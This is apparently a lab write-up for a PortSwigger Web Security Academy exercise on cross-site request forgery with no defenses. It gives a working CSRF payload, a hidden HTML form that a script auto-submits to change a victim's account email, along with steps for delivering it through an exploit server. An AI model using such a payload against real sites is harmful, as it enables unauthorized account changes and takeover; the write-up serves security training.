## LAB - 1
**lab link: <https://portswigger.net/web-security/csrf/lab-no-defenses>**

 **Topic :-** 

- CSRF vulnerability with no defenses.

 **To Solve :-**

- Craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

 **Procedure :-**

1.  In the vulnerable site, There's an update email feature which can be exploited.
2. The exploit server is also provided for exploit creation and delivery.
3. Create an CSRF exploit .
```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="anything%40web-security-academy.net"> 
</form> 
<script> 
	document.forms[0].submit(); 
</script>
```
submit this in the body of exploit sever, store and view exploit firsthand , and then deliver exploit to victim.


``` For this to succeed, victim has to recently changed the email, for the cookies not being mismatched. ```